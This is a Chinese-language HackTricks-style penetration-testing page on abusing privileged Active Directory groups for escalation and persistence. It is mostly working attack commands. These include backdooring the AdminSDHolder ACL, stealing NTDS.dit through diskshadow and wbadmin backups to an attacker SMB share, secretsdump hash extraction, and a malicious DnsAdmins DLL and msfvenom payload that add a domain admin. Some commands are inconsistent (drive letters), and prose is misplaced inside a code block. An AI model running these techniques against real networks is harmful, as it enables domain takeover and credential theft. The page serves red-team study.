# 特权组

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 具有管理权限的知名组

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

## 账户操作员

该组有权在域上创建不是管理员的帐户和组。此外，它允许在域控制器（DC）上进行本地登录。

要识别此组的成员，执行以下命令：
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
允许添加新用户，以及在DC01上进行本地登录。

## AdminSDHolder组

**AdminSDHolder**组的访问控制列表（ACL）至关重要，因为它为Active Directory中的所有“受保护组”（包括高特权组）设置权限。该机制通过防止未经授权的修改，确保了这些组的安全性。

攻击者可以通过修改**AdminSDHolder**组的ACL来利用这一点，授予标准用户完全权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果此用户的权限被更改或移除，由于系统设计的原因，它们将在一个小时内自动恢复。

用于查看成员和修改权限的命令包括：
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
一个脚本可用于加快恢复过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

有关更多详细信息，请访问[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。

## AD 回收站

该组的成员可以读取已删除的 Active Directory 对象，这可能会泄露敏感信息：
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 域控制器访问

除非用户是`Server Operators`组的成员，否则对DC上的文件的访问是受限的，这会改变访问级别。

### 特权升级

使用Sysinternals的`PsService`或`sc`，可以检查和修改服务权限。例如，`Server Operators`组对某些服务拥有完全控制权，允许执行任意命令和特权升级：
```cmd
C:\> .\PsService.exe security AppReadiness
```
这个命令显示`Server Operators`具有完全访问权限，可以操纵服务以获取提升的特权。

## 备份操作员

加入`Backup Operators`组可以访问`DC01`文件系统，因为具有`SeBackup`和`SeRestore`特权。这些特权使得即使没有明确权限，也可以使用`FILE_FLAG_BACKUP_SEMANTICS`标志进行文件夹遍历、列出和复制文件。执行特定脚本是必要的。要列出组成员，请执行：
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 本地攻击

要在本地利用这些特权，需要执行以下步骤：

1. 导入必要的库：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. 启用并验证 `SeBackupPrivilege`：
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 访问并复制受限目录中的文件，例如：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD攻击

直接访问域控制器的文件系统允许窃取`NTDS.dit`数据库，其中包含所有域用户和计算机的NTLM哈希值。

#### 使用diskshadow.exe

1. 创建`C`驱动器的阴影副本：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 从影子副本中复制 `NTDS.dit` 文件：
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
或者，使用 `robocopy` 进行文件复制：
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 提取 `SYSTEM` 和 `SAM` 以检索哈希值：
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. 从 `NTDS.dit` 中检索所有哈希值：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### 使用 wbadmin.exe

1. 在攻击者机器上为 SMB 服务器设置 NTFS 文件系统，并在目标机器上缓存 SMB 凭据。
2. 使用 `wbadmin.exe` 进行系统备份和 `NTDS.dit` 提取：
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

有关实际演示，请参见[与 IPPSEC 的演示视频](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)。

## DnsAdmins

**DnsAdmins** 组的成员可以利用其特权在 DNS 服务器上以 SYSTEM 特权加载任意 DLL，通常托管在域控制器上的 DNS 服务器。这种能力提供了重要的利用潜力。

要列出 **DnsAdmins** 组的成员，请使用：
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 执行任意 DLL

成员可以使用诸如以下命令使 DNS 服务器加载任意 DLL（可以是本地的，也可以是来自远程共享的）：
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
重新启动DNS服务（可能需要额外的权限）是加载DLL所必需的：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
#### Mimilib.dll
可以使用mimilib.dll进行命令执行，修改它以执行特定命令或反向shell。[查看此文章](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)获取更多信息。

### WPAD Record for MitM
DnsAdmins可以操纵DNS记录，通过在禁用全局查询阻止列表后创建WPAD记录来执行中间人攻击。工具如Responder或Inveigh可用于欺骗和捕获网络流量。

### Event Log Readers
成员可以访问事件日志，可能会找到敏感信息，如明文密码或命令执行细节：
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows权限
该组可以修改域对象上的DACL，可能授予DCSync特权。利用该组进行特权升级的技术在Exchange-AD-Privesc GitHub存储库中有详细说明。
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V管理员
Hyper-V管理员拥有对Hyper-V的完全访问权限，可以被利用来控制虚拟化的域控制器。这包括克隆活动的DC并从NTDS.dit文件中提取NTLM哈希。

### 漏洞利用示例
Firefox的Mozilla维护服务可以被Hyper-V管理员利用来以SYSTEM身份执行命令。这涉及创建一个硬链接到受保护的SYSTEM文件，并用恶意可执行文件替换它：
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## 组织管理

在部署**Microsoft Exchange**的环境中，一个名为**Organization Management**的特殊组拥有重要的能力。该组有权限**访问所有域用户的邮箱**，并且对**'Microsoft Exchange Security Groups'**组织单元（OU）拥有**完全控制**。这种控制包括**`Exchange Windows Permissions`**组，可以被利用进行特权升级。

### 特权利用和命令

#### 打印操作员
**Print Operators**组的成员拥有多项特权，包括**`SeLoadDriverPrivilege`**，允许他们**在本地登录到域控制器**，关闭它，并管理打印机。要利用这些特权，特别是如果**`SeLoadDriverPrivilege`**在非提升的上下文中不可见，需要绕过用户账户控制（UAC）。

要列出此组的成员，使用以下PowerShell命令：
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
#### 远程桌面用户
该组成员通过远程桌面协议（RDP）被授予访问PC的权限。要枚举这些成员，可使用PowerShell命令：
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
进一步了解如何利用RDP可以在专门的渗透测试资源中找到。

#### 远程管理用户
成员可以通过**Windows远程管理（WinRM）**访问计算机。通过以下方式实现对这些成员的枚举：
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
#### 服务器操作员
该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、更改系统时间和关闭系统。要枚举成员，可以使用以下命令：
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考资料 <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
